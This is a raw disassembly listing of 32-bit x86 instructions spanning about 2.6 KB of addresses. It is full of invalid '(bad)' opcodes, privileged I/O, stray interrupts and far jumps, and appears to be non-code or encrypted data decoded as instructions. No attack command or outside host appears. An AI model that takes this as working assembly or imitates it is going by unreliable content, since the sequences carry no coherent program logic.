  4242b6:	test   BYTE PTR [esi+eax*8-0x33],dl
  4242ba:	add    BYTE PTR [ecx],ch
  4242bc:	mov    esi,0x34b6075b
  4242c1:	sbb    al,0x47
  4242c3:	out    dx,eax
  4242c4:	mov    al,0x25
  4242c6:	dec    ebp
  4242c7:	mov    eax,0x47dc75a1
  4242cc:	sub    al,0x4
  4242ce:	jmp    0x26a:0xd937b4da
  4242d5:	jns    0x42430d
  4242d7:	jp     0x424292
  4242d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242da:	loope  0x42426c
  4242dc:	in     eax,0x3d
  4242de:	bound  ebp,QWORD PTR [ebx+eax*8+0x2fa19167]
  4242e5:	and    BYTE PTR [ebx-0x3f],bh
  4242e8:	add    ecx,edx
  4242ea:	or     DWORD PTR [esi-0x46ca5bb2],ecx
  4242f0:	into   
  4242f1:	cdq    
  4242f2:	shl    esi,1
  4242f4:	mov    ecx,ecx
  4242f6:	xchg   DWORD PTR ss:[esi+0x7d],esi
  4242fa:	jmp    FWORD PTR [ebp+eiz*8-0x11]
  4242fe:	and    DWORD PTR [ecx-0x5fc79b32],esi
  424304:	ins    DWORD PTR es:[edi],dx
  424305:	cmp    al,0x4b
  424307:	clc    
  424308:	push   0xe40ff0d7
  42430d:	adc    al,0x5b
  42430f:	retf   0x59ce
  424312:	adc    BYTE PTR [ebx],cl
  424314:	inc    ebp
  424315:	xchg   edi,eax
  424316:	sbb    DWORD PTR [edi+0x1a13a2d0],edx
  42431c:	or     BYTE PTR [ebp+0x1717f2a6],dh
  424322:	shr    BYTE PTR [ebx-0x59],0xd1
  424326:	pop    edi
  424327:	xchg   edi,eax
  424328:	push   ebx
  424329:	pushf  
  42432a:	inc    eax
  42432b:	daa    
  42432c:	into   
  42432d:	out    0x60,al
  42432f:	sub    dl,dh
  424331:	repnz push edx
  424333:	or     DWORD PTR [esi],0x3a62807e
  424339:	push   ebp
  42433a:	push   ebx
  42433b:	fcomp  DWORD PTR [ebx]
  42433d:	inc    esi
  42433e:	ss iret 
  424340:	cmp    al,0x91
  424342:	mov    al,ds:0xee9b5a36
  424347:	adc    DWORD PTR [eax+0x664e7444],ebp
  42434d:	test   eax,0xb779a3c6
  424352:	pop    ecx
  424353:	cmp    eax,0x54792f2c
  424358:	mov    edi,0xaec8c7b1
  42435d:	ins    BYTE PTR es:[edi],dx
  42435e:	retf   0x37e6
  424361:	xor    BYTE PTR [ebx+0x329c03c5],dl
  424367:	push   ebp
  424368:	jge    0x42433d
  42436a:	adc    ch,BYTE PTR [eax+0x6]
  42436d:	ret    0x5846
  424370:	cli    
  424371:	(bad)  
  424372:	gs pop ds
  424374:	aas    
  424375:	dec    eax
  424376:	das    
  424377:	int    0x86
  424379:	stos   DWORD PTR es:[edi],eax
  42437a:	pop    esi
  42437b:	lods   al,BYTE PTR ds:[esi]
  42437c:	cmp    al,0xe
  42437e:	add    eax,0x509b114d
  424383:	ins    BYTE PTR es:[edi],dx
  424384:	clc    
  424385:	outs   dx,BYTE PTR ds:[esi]
  424386:	xor    esi,ebx
  424388:	cmp    eax,0xbae025a2
  42438d:	(bad)  
  42438e:	sbb    bh,al
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243e6
  424401:	xor    DWORD PTR [ebx+0x11],esp
  424404:	xchg   esp,eax
  424405:	add    BYTE PTR [ecx],0x0
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	lea    esi,[esp+eax*4+0x29]
  424410:	aas    
  424411:	lods   eax,DWORD PTR ds:[esi]
  424412:	out    dx,al
  424413:	xor    eax,0x76d7445f
  424418:	sbb    BYTE PTR [edx],bl
  42441a:	xchg   esi,eax
  42441b:	or     DWORD PTR [esi+0x7e],esi
  42441e:	mov    edx,0x10b12464
  424423:	loope  0x424446
  424425:	rcl    DWORD PTR [ebp+0x21],cl
  424428:	test   DWORD PTR [ebx+0x4e],edx
  42442b:	dec    ecx
  42442c:	mov    cl,0xa5
  42442e:	xor    ah,ah
  424430:	add    dh,ch
  424432:	inc    ecx
  424433:	push   cs
  424434:	fnstenv [ecx]
  424436:	mov    esp,0x631eb6d2
  42443b:	iret   
  42443c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42443d:	sbb    al,0x7a
  42443f:	push   0x31
  424441:	dec    esi
  424442:	pusha  
  424443:	mov    ebx,0x547ef685
  424448:	test   al,0xde
  42444a:	xor    BYTE PTR [ebx-0x4e0805a3],al
  424450:	push   ss
  424451:	lock inc ebx
  424453:	and    ebp,DWORD PTR [eax+0x73748da2]
  424459:	div    BYTE PTR [edi+0x70]
  42445c:	popa   
  42445d:	xchg   esp,eax
  42445e:	test   eax,0x489acd34
  424463:	sub    al,0x97
  424465:	xchg   ebp,eax
  424466:	push   esp
  424467:	stos   DWORD PTR es:[edi],eax
  424468:	scas   eax,DWORD PTR es:[edi]
  424469:	xchg   esp,eax
  42446a:	sub    BYTE PTR [ebx-0x122cd1c3],dh
  424470:	loop   0x42449e
  424472:	nop
  424473:	jp     0x424433
  424475:	jge    0x4244e8
  424477:	sbb    al,0x5
  424479:	add    ebp,DWORD PTR [ebx-0x4ba01c82]
  42447f:	mov    ecx,0xe0fb46c1
  424484:	fdiv   DWORD PTR [eax+edi*4+0x454ba020]
  42448b:	dec    edx
  42448c:	ja     0x424487
  42448e:	dec    ebx
  42448f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424490:	popa   
  424491:	sub    DWORD PTR [edi+0x15],edx
  424494:	sub    DWORD PTR [esi+0x58d430e2],ebp
  42449a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42449b:	lahf   
  42449c:	gs mov al,0x40
  42449f:	add    al,0x53
  4244a1:	ja     0x4244f1
  4244a3:	sub    eax,0x45380813
  4244a8:	inc    edx
  4244a9:	sbb    al,0x1
  4244ab:	xlat   BYTE PTR ds:[ebx]
  4244ac:	ret    0x4e03
  4244af:	dec    ebx
  4244b0:	pop    es
  4244b1:	inc    eax
  4244b2:	inc    ebp
  4244b3:	mov    edi,0x7a1684dd
  4244b8:	sbb    esi,DWORD PTR [ecx-0x5b]
  4244bb:	int    0xa3
  4244bd:	mov    edi,0xa3ad24dd
  4244c2:	in     eax,0xf0
  4244c4:	pop    ecx
  4244c5:	mov    edi,0x16fadc8b
  4244ca:	adc    al,0xec
  4244cc:	les    edx,FWORD PTR [ecx+0x2aaa08e9]
  4244d2:	jp     0x4244cd
  4244d4:	jno    0x42451d
  4244d6:	sub    bh,dl
  4244d8:	stos   DWORD PTR es:[edi],eax
  4244d9:	(bad)  
  4244da:	fdiv   DWORD PTR [eiz*1+0x27924698]
  4244e1:	into   
  4244e2:	sub    ah,BYTE PTR [eax]
  4244e4:	test   eax,0x1f06df4b
  4244e9:	push   esi
  4244ea:	ins    DWORD PTR es:[edi],dx
  4244eb:	jmp    0x4244f1
  4244ed:	pop    edi
  4244ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244ef:	test   eax,0xcdcf7b2f
  4244f4:	fisubr WORD PTR [edx-0x37]
  4244f7:	cmp    esi,DWORD PTR [ebx]
  4244f9:	and    BYTE PTR [esi+0x2e],al
  4244fc:	in     al,dx
  4244fd:	pop    DWORD PTR [esp+ebp*2-0x12deb7c9]
  424504:	xchg   esi,eax
  424505:	push   0x661af69c
  42450a:	mov    ah,0x22
  42450c:	daa    
  42450d:	adc    DWORD PTR ds:0xb,ebx
	...
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x75],1
  424581:	jge    0x424573
  424583:	and    ebx,DWORD PTR [eax+0x4000183]
  424589:	add    DWORD PTR [eax],eax
  42458b:	add    bh,dh
  42458d:	xchg   DWORD PTR ds:0x4ef10c62,ecx
  424593:	mov    esi,0xe9350a0e
  424598:	(bad)  
  424599:	cmp    ecx,edx
  42459b:	adc    BYTE PTR [ebx+eax*4-0x462706e],ah
  4245a2:	fwait
  4245a3:	pop    esp
  4245a4:	lods   eax,DWORD PTR ds:[esi]
  4245a5:	clc    
  4245a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245a7:	or     eax,0xec4df1f3
  4245ac:	fiadd  DWORD PTR [edx+0x13]
  4245af:	sar    DWORD PTR [esi+edx*1+0x62cd9f76],1
  4245b6:	fwait
  4245b7:	cdq    
  4245b8:	push   esp
  4245b9:	int    0x3e
  4245bb:	leave  
  4245bc:	ret    
  4245bd:	mov    dl,0x2a
  4245bf:	int    0x1a
  4245c1:	or     ch,ch
  4245c3:	ret    0x89a0
  4245c6:	sbb    esi,edi
  4245c8:	scas   eax,DWORD PTR es:[edi]
  4245c9:	sub    eax,0x984d3770
  4245ce:	xchg   ebp,eax
  4245cf:	and    al,0xe9
  4245d1:	pop    esi
  4245d2:	stos   BYTE PTR es:[edi],al
  4245d3:	popf   
  4245d4:	jns    0x424569
  4245d6:	pop    esp
  4245d7:	adc    esp,DWORD PTR [ebx-0x6965114e]
  4245dd:	jg     0x424567
  4245df:	frstor [ecx]
  4245e1:	xor    DWORD PTR [ebx+0x68],ebp
  4245e4:	mov    bl,0x7b
  4245e6:	cdq    
  4245e7:	in     al,dx
  4245e8:	fwait
  4245e9:	push   eax
  4245ea:	lds    eax,FWORD PTR gs:[edi-0x2940192a]
  4245f1:	aas    
  4245f2:	cmp    edx,DWORD PTR [esi+esi*8-0x21d0b2f0]
  4245f9:	mov    esi,0x177b1469
  4245fe:	jmp    0xaa4e:0xfe7b8e9b
  424605:	ret    0x639
  424608:	lods   al,BYTE PTR ds:[esi]
  424609:	mov    esp,0xc17d6f99
  42460e:	(bad)  
  42460f:	pop    esi
  424610:	jns    0x4245f0
  424612:	xchg   ecx,eax
  424613:	lods   al,BYTE PTR ds:[esi]
  424614:	jg     0x4245ce
  424616:	and    ch,bh
  424618:	add    eax,0x4b3c10f
  42461d:	fs bnd je 0x4245b4
  424621:	inc    edx
  424622:	jp     0x42461c
  424624:	(bad)
  424627:	pop    ebp
  424628:	(bad)  
  424629:	xor    DWORD PTR [eax+0x16c8dfcf],eax
  42462f:	or     al,0x83
  424631:	inc    ebx
  424632:	repz jmp FWORD PTR [edx+0x29]
  424636:	adc    eax,0x5ece44cb
  42463b:	sub    BYTE PTR [ebx],ch
  42463d:	dec    ebx
  42463e:	dec    ebx
  42463f:	cmp    BYTE PTR [ebp-0x2921b995],bl
  424645:	loopne 0x42469e
  424647:	xor    bl,BYTE PTR [edi-0x7f]
  42464a:	mov    al,ds:0x9ba16e9c
  42464f:	test   eax,0xa44a8a03
  424654:	mov    al,ds:0x47b38525
  424659:	jecxz  0x4245fc
  42465b:	xchg   esi,eax
  42465c:	fcom   st(0)
  42465e:	std    
  42465f:	push   ds
  424660:	inc    ebp
  424661:	adc    ecx,eax
  424663:	test   DWORD PTR [edx+0x7d87fd63],edi
  424669:	mov    edi,0xdac79985
  42466e:	in     eax,0x76
  424670:	mov    cl,0xa
  424672:	lea    esp,[ecx]
  424674:	add    esp,0xe17738d5
  42467a:	outs   dx,DWORD PTR ds:[esi]
  42467b:	aad    0xfc
  42467d:	sahf   
  42467e:	ficomp DWORD PTR [esi+0x38f849e0]
  424684:	dec    ebx
  424685:	addr16 xchg esi,eax
  424687:	arpl   WORD PTR [ebp+eax*1+0x3d],di
  42468b:	and    DWORD PTR [esi+0x436f90],edx
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi],dl
  424701:	dec    ebp
  424702:	jl     0x424728
  424704:	pushf  
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	dec    ecx
  42470d:	loopne 0x424753
  42470f:	ds pop edi
  424711:	sti    
  424712:	sub    BYTE PTR [ebp-0x2b],dh
  424715:	aam    0x75
  424717:	in     al,dx
  424718:	mov    dl,BYTE PTR [ebp-0x1943f2c4]
  42471e:	punpckldq mm3,mm6
  424721:	inc    eax
  424722:	adc    bh,BYTE PTR [esi]
  424724:	or     BYTE PTR [edi+0x2081fab2],dl
  42472a:	and    dh,BYTE PTR [edi-0x21183fae]
  424730:	inc    ecx
  424731:	hlt    
  424732:	mov    edi,0x4c49ac0e
  424737:	dec    esi
  424738:	jns    0x42475f
  42473a:	pop    esi
  42473b:	dec    ebx
  42473c:	mov    edi,0x13f93c95
  424741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424742:	out    dx,al
  424743:	push   cs
  424744:	ja     0x4247ae
  424746:	mov    edi,0xc37e60f4
  42474b:	xor    edi,DWORD PTR [esp+ebp*8-0x6e5ed27b]
  424752:	mov    dh,0x1
  424754:	fisub  DWORD PTR [ebp+0x67]
  424757:	hlt    
  424758:	test   DWORD PTR [edi+esi*4+0x52],edi
  42475c:	aas    
  42475d:	jp     0x4247ce
  42475f:	push   es
  424760:	(bad)  
  424761:	(bad)  
  424762:	daa    
  424763:	xor    BYTE PTR [edi+0x6c],bh
  424766:	and    DWORD PTR ds:0xea3afd3c,edi
  42476c:	jecxz  0x424762
  42476e:	inc    ecx
  42476f:	rol    BYTE PTR [ebx],0xb9
  424772:	std    
  424773:	xor    edi,edx
  424775:	xor    al,0x44
  424777:	pop    edx
  424778:	cmp    DWORD PTR [edi-0x63d240fb],0x3f73ba77
  424782:	sub    al,0x21
  424784:	jmp    0x5725:0x765a1c61
  42478b:	nop
  42478c:	pop    edx
  42478d:	sub    BYTE PTR [edi-0x44636f6e],ch
  424793:	ins    DWORD PTR es:[edi],dx
  424794:	pop    ebx
  424795:	je     0x424766
  424797:	sub    BYTE PTR [ebp-0x2fefd5c8],dl
  42479d:	jae    0x42475a
  42479f:	test   ch,bh
  4247a1:	sbb    al,0x49
  4247a3:	into   
  4247a4:	inc    ebp
  4247a5:	cmp    eax,0xe2506659
  4247aa:	sbb    esp,DWORD PTR [edi+ebx*1]
  4247ad:	adc    BYTE PTR [edi],cl
  4247af:	mov    bl,0x8a
  4247b1:	or     esi,ebx
  4247b3:	cmp    eax,0x8004bcf4
  4247b8:	jl     0x424829
  4247ba:	dec    ecx
  4247bb:	aaa    
  4247bc:	mov    ch,0x97
  4247be:	sbb    al,0xdd
  4247c0:	xchg   BYTE PTR [edi],bl
  4247c2:	inc    edx
  4247c3:	pop    ebx
  4247c4:	inc    ebx
  4247c5:	and    ecx,edi
  4247c7:	push   eax
  4247c8:	cmp    bh,ah
  4247ca:	cmp    eax,0xabdce728
  4247cf:	test   al,0x73
  4247d1:	mov    ch,dh
  4247d3:	xor    bl,BYTE PTR [ebp-0x3b3d0e7]
  4247d9:	hlt    
  4247da:	ss adc esi,edx
  4247dd:	jmp    0x6ed3:0x3400804a
  4247e4:	add    bh,al
  4247e6:	sbb    DWORD PTR [edi],edi
  4247e8:	nop
  4247e9:	ss xchg ebp,eax
  4247eb:	or     eax,0xe4098c20
  4247f0:	xchg   edi,eax
  4247f1:	imul   ecx,DWORD PTR [ebp-0x71],0x7d
  4247f5:	mov    WORD PTR [eax+0x37],es
  4247f8:	not    BYTE PTR [edi+0x20]
  4247fb:	test   al,0xe9
  4247fd:	outs   dx,DWORD PTR ds:[esi]
  4247fe:	dec    eax
  4247ff:	jne    0x424821
  424801:	dec    edi
  424802:	sub    BYTE PTR [eax+0x61],dl
  424805:	xchg   edi,eax
  424806:	lds    edx,FWORD PTR [ecx]
  424808:	and    dl,BYTE PTR [ebp+0x50]
  42480b:	je     0x4247ac
  42480d:	in     eax,dx
  42480e:	imul   eax,edx,0x0
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	out    dx,al
  424881:	lock das 
  424883:	retf   0x85a0
  424886:	add    DWORD PTR [eax],eax
  424888:	add    al,0x1
  42488a:	add    BYTE PTR [eax],al
  42488c:	sub    eax,0xf010812a
  424891:	jne    0x4248af
  424893:	jg     0x4248f8
  424895:	pop    ebx
  424896:	and    esi,DWORD PTR [ebx-0x47]
  424899:	dec    esp
  42489a:	or     DWORD PTR [ebx+0x3],esi
  42489d:	aam    0x6b
  42489f:	sub    al,0x6f
  4248a1:	dec    ebp
  4248a2:	jbe    0x424834
  4248a4:	test   BYTE PTR [ecx-0x5c],cl
  4248a7:	cmova  ecx,DWORD PTR [ebx-0x6a]
  4248ab:	out    0xcd,eax
  4248ad:	dec    esp
  4248ae:	push   eax
  4248af:	pop    DWORD PTR [eax]
  4248b1:	or     eax,0x6940d5d3
  4248b6:	xchg   edi,eax
  4248b7:	ds dec edi
  4248b9:	mov    ds:0x74517f4f,eax
  4248be:	jb     0x424854
  4248c0:	mov    esi,0x694bb25b
  4248c5:	imul   edi,esp,0xec4baedd
  4248cb:	add    BYTE PTR ds:0x579165ce,cl
  4248d1:	inc    ebp
  4248d2:	sbb    esi,DWORD PTR [ebp-0x2c]
  4248d5:	je     0x424897
  4248d7:	(bad)  
  4248d9:	inc    ebp
  4248da:	push   esp
  4248db:	xlat   BYTE PTR ds:[ebx]
  4248dc:	loope  0x424863
  4248de:	hlt    
  4248df:	out    dx,al
  4248e0:	inc    ecx
  4248e1:	sbb    BYTE PTR [ebp+0x42],0x52
  4248e5:	or     al,0xe9
  4248e7:	in     eax,dx
  4248e8:	cmc    
  4248e9:	fst    QWORD PTR [esi-0x5]
  4248ec:	push   0xffffffe5
  4248ee:	xlat   BYTE PTR ds:[ebx]
  4248ef:	dec    esi
  4248f0:	pusha  
  4248f1:	mov    cl,0xd7
  4248f3:	enter  0xa531,0x56
  4248f7:	fisub  DWORD PTR [ebx]
  4248f9:	mov    BYTE PTR [ebx*2-0x5dabce62],bl
  424900:	imul   esi,DWORD PTR [edi-0x4fd9b362],0x1d1cd921
  42490a:	mov    BYTE PTR [ebx],bl
  42490c:	push   ebx
  42490d:	pop    edx
  42490e:	adc    esp,DWORD PTR [edx*4+0x2ecb43e]
  424915:	xchg   ebx,eax
  424916:	adc    dh,BYTE PTR [bx+si-0x1f2]
  42491b:	sub    al,0xc8
  42491d:	shl    BYTE PTR cs:[bp+si+0x41e6],cl
  424923:	xchg   ebp,eax
  424924:	and    al,0xdf
  424926:	(bad)  [esi-0x6]
  424929:	jne    0x424902
  42492b:	xchg   esi,esi
  42492d:	je     0x424980
  42492f:	xchg   esi,eax
  424930:	push   esi
  424931:	or     BYTE PTR [edi-0x59962c36],ch
  424937:	cdq    
  424938:	imul   edx,edx,0xffffffb3
  42493b:	mov    eax,0xdaf9ec51
  424940:	jmp    0x78f7:0x977277b5
  424947:	ss es pop esp
  42494a:	cdq    
  42494b:	test   al,0x38
  42494d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42494e:	push   eax
  42494f:	mov    cl,0xad
  424951:	ror    al,1
  424953:	mov    gs,ebp
  424955:	stos   BYTE PTR es:[edi],al
  424956:	add    eax,DWORD PTR [esp+ecx*8-0x1f]
  42495a:	(bad)  
  42495b:	adc    esp,esp
  42495d:	adc    ebx,DWORD PTR [esi+0x78]
  424960:	stc    
  424961:	loopne 0x424900
  424963:	in     eax,0xc8
  424965:	jbe    0x424903
  424967:	loope  0x4249c7
  424969:	push   0x43
  42496b:	(bad)  
  42496c:	call   ebx
  42496e:	dec    ebx
  42496f:	(bad)  
  424971:	scas   al,BYTE PTR es:[edi]
  424972:	sub    esi,edi
  424974:	cmp    dh,al
  424976:	push   eax
  424977:	pop    ebx
  424978:	mov    dl,0x96
  42497a:	xor    al,0x42
  42497c:	sahf   
  42497d:	cmp    edi,edi
  42497f:	dec    ecx
  424980:	sbb    al,0x2e
  424982:	js     0x42490a
  424984:	outs   dx,BYTE PTR ds:[esi]
  424985:	ror    DWORD PTR [eax+0x1e127a3f],1
  42498b:	into   
  42498c:	adc    al,0x3c
  42498e:	imul   edi,DWORD PTR [eax+0x0],0x0
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    ch,ch
  424a01:	and    eax,0x86a4c2b4
  424a06:	add    DWORD PTR [eax],eax
  424a08:	add    al,0x1
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	adc    ebx,0x62
  424a0f:	js     0x4249e2
  424a11:	and    ebp,ecx
  424a13:	mov    al,ds:0x99bf6ed
  424a18:	pop    edx
  424a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a1a:	pop    esp
  424a1b:	push   ds
  424a1c:	sbb    DWORD PTR ds:0xfe27fbc0,edx
  424a22:	cmp    BYTE PTR [edi],dh
  424a24:	cmp    DWORD PTR [edx+0x223be404],ebp
  424a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a2b:	adc    eax,0x808d408c
  424a30:	jmp    0xf2b9015
  424a35:	jnp    0x424a8f
  424a37:	arpl   ax,di
  424a39:	int3   
  424a3a:	xor    al,0x42
  424a3c:	pushf  
  424a3d:	je     0x424ab1
  424a3f:	and    ah,BYTE PTR [edi-0x39]
  424a42:	and    eax,0x5aca1c3b
  424a47:	rcl    BYTE PTR [edi+0x2e18ef59],0xee
  424a4e:	cmp    eax,0x1d2ad04c
  424a53:	icebp  
  424a54:	mov    ds:0x700c6cc3,al
  424a59:	imul   esi,DWORD PTR [edx+eiz*2+0x74],0xe40960b2
  424a61:	xchg   esp,eax
  424a62:	ficomp WORD PTR [esi]
  424a64:	lea    edx,[esi-0x250157f9]
  424a6a:	mov    ah,0xa0
  424a6c:	lock mov al,ds:0x11293516
  424a72:	(bad)  
  424a73:	xchg   esp,eax
  424a74:	and    BYTE PTR [ebx+eax*1+0x5cfeab2f],bl
  424a7b:	jae    0x424a66
  424a7d:	in     al,dx
  424a7e:	arpl   WORD PTR [esi-0x784407a6],sp
  424a84:	sbb    al,0xb6
  424a86:	hlt    
  424a87:	push   ebx
  424a88:	jmp    0x8199:0xebb412a5
  424a8f:	movzx  ebx,di
  424a92:	sahf   
  424a93:	cmp    BYTE PTR [edi-0x7b710fab],dl
  424a99:	inc    edx
  424a9a:	mov    edx,0xbb055e60
  424a9f:	pop    esp
  424aa0:	clc    
  424aa1:	es enter 0x382a,0x10
  424aa6:	pop    ebp
  424aa7:	push   es
  424aa8:	ins    DWORD PTR es:[edi],dx
  424aa9:	mov    cl,0x8a
  424aab:	add    dl,bl
  424aad:	fs mov ebp,0xe89d8cdf
  424ab3:	or     bh,ah
  424ab5:	inc    ebp
  424ab6:	xchg   edx,eax
  424ab7:	call   0xd6d:0x131465a
  424abe:	xchg   edi,eax
  424abf:	arpl   WORD PTR [ebx],bp
  424ac1:	into   
  424ac2:	sahf   
  424ac3:	push   ds
  424ac4:	clc    
  424ac5:	mov    al,ds:0x7ea46543
  424aca:	int    0x5b
  424acc:	stc    
  424acd:	inc    eax
  424ace:	push   ecx
  424acf:	retf   0x11df
  424ad2:	sub    edx,0x27
  424ad5:	push   ecx
  424ad6:	jge    0x424a9a
  424ad8:	push   es
  424ad9:	adc    dl,BYTE PTR ds:0xda1e7c8b
  424adf:	cmp    BYTE PTR [esi+0x56],0x68
  424ae3:	call   0x9df2:0x863e7398
  424aea:	add    bl,BYTE PTR [edi-0x6f15e295]
  424af0:	dec    esi
  424af1:	pop    esp
  424af2:	cwde   
  424af3:	addr16 sub eax,0x9e8ab365
  424af9:	or     ebx,ebx
  424afb:	mov    dl,0x57
  424afd:	or     dl,ch
  424aff:	jg     0x424ab6
  424b01:	outs   dx,BYTE PTR ds:[esi]
  424b02:	mov    esi,0xf7fcdad4
  424b07:	lahf   
  424b08:	jl     0x424b1a
  424b0a:	rol    BYTE PTR [edx+0x22],cl
  424b0d:	lahf   
  424b0e:	sub    ebp,DWORD PTR [edx+0x0]
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	into   
  424b81:	xchg   ecx,eax
  424b82:	cwde   
  424b83:	mov    al,ds:0x187a8
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	(bad)  
  424b8d:	push   cs
  424b8e:	sbb    esp,DWORD PTR [eax+0x62cd52b4]
  424b94:	je     0x424be1
  424b96:	cs mov esi,0x786d6d34
  424b9c:	iret   
  424b9d:	adc    edi,ebp
  424b9f:	fsubr  DWORD PTR [ebx]
  424ba1:	mov    ecx,DWORD PTR [esi-0x43b490b7]
  424ba7:	sub    BYTE PTR [ecx-0xeefb027],bl
  424bad:	and    bl,BYTE PTR [ecx]
  424baf:	mov    ah,0xdf
  424bb1:	xchg   esp,eax
  424bb2:	dec    ecx
  424bb3:	mov    esp,0xbebec05b
  424bb8:	daa    
  424bb9:	mov    esi,?
  424bbb:	xchg   DWORD PTR [esi],ecx
  424bbd:	push   ds
  424bbe:	fld    st(0)
  424bc0:	mov    esp,0x3112399d
  424bc5:	out    0x5,al
  424bc7:	xchg   DWORD PTR [edx],eax
  424bc9:	mov    edi,DWORD PTR [esi-0x20479db0]
  424bcf:	outs   dx,BYTE PTR ds:[esi]
  424bd0:	mov    eax,0xddb12eac
  424bd5:	xlat   BYTE PTR ds:[ebx]
  424bd6:	mov    edi,0x7f64ad1a
  424bdb:	xor    eax,0x88e220d1
  424be0:	inc    edi
  424be1:	pop    es
  424be2:	fcompp 
  424be4:	popf   
  424be5:	mov    dh,0x70
  424be7:	lahf   
  424be8:	call   0x1f65137d
  424bed:	fsubr  DWORD PTR [ebx+0x2a1db2ca]
  424bf3:	push   esp
  424bf4:	push   es
  424bf5:	fs stc 
  424bf7:	fiadd  WORD PTR [ebx]
  424bf9:	inc    esp
  424bfa:	ins    DWORD PTR es:[edi],dx
  424bfb:	lods   al,BYTE PTR ds:[esi]
  424bfc:	aaa    
  424bfd:	xchg   ecx,eax
  424bfe:	jb     0x424bd8
  424c00:	lds    edx,FWORD PTR [eax-0x81d626b]
  424c06:	inc    edi
  424c07:	push   edi
  424c08:	cmp    cl,BYTE PTR [ecx]
  424c0a:	pop    esp
  424c0b:	cmp    DWORD PTR [edi-0x19],0x23
  424c0f:	inc    edx
  424c10:	sbb    al,0x30
  424c12:	and    bh,BYTE PTR [edx]
  424c14:	jno    0x424b9d
  424c16:	and    al,0x19
  424c18:	pop    ebp
  424c19:	jmp    0x424c06
  424c1b:	iret   
  424c1c:	mov    al,ds:0x29a69754
  424c21:	add    eax,0x8ca051fe
  424c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c27:	mov    ecx,0x6540caa5
  424c2c:	daa    
  424c2d:	mov    cl,0xbb
  424c2f:	mov    cl,0x81
  424c31:	ja     0x424c30
  424c33:	inc    ebx
  424c34:	mov    bl,0x7
  424c36:	mov    ebp,0x56a3e096
  424c3b:	popa   
  424c3c:	cld    
  424c3d:	jno    0x8d821af7
  424c43:	aam    0x8b
  424c45:	arpl   bp,ax
  424c47:	int3   
  424c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c49:	xor    eax,0x9dcc3d55
  424c4e:	mov    dh,0x6a
  424c50:	loop   0x424c7d
  424c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c53:	mov    BYTE PTR [esi+0x7d9630e0],cl
  424c59:	push   edi
  424c5a:	rol    DWORD PTR gs:0xfd48f1c9,cl
  424c61:	push   ds
  424c62:	ins    DWORD PTR es:[edi],dx
  424c63:	fwait
  424c64:	lock cwde 
  424c66:	aam    0x8f
  424c68:	inc    esi
  424c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c6a:	jb     0x424ce4
  424c6c:	fwait
  424c6d:	jne    0x424c31
  424c6f:	popf   
  424c70:	shl    BYTE PTR [ebp-0x42],1
  424c73:	adc    ebx,DWORD PTR [ecx]
  424c75:	jne    0x424cbf
  424c77:	cmp    ebx,DWORD PTR [ebp-0x6e]
  424c7a:	adc    edi,0xbb7931e
  424c80:	mov    dh,0x14
  424c82:	leave  
  424c83:	push   esp
  424c84:	cli    
  424c85:	xor    BYTE PTR [ebx],cl
  424c87:	into   
  424c88:	out    0xd4,al
  424c8a:	add    BYTE PTR [ecx+0x60],bl
  424c8d:	mov    cl,0x43
  424c8f:	add    BYTE PTR ds:[eax],al
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x2906ae58]
  424d02:	push   ss
  424d03:	data16 lods al,BYTE PTR ds:[esi]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	and    ch,ch
  424d0e:	aad    0x52
  424d10:	dec    esi
  424d11:	stos   DWORD PTR es:[edi],eax
  424d12:	adc    esp,DWORD PTR [ebx-0xc31bcb7]
  424d18:	xchg   bl,ah
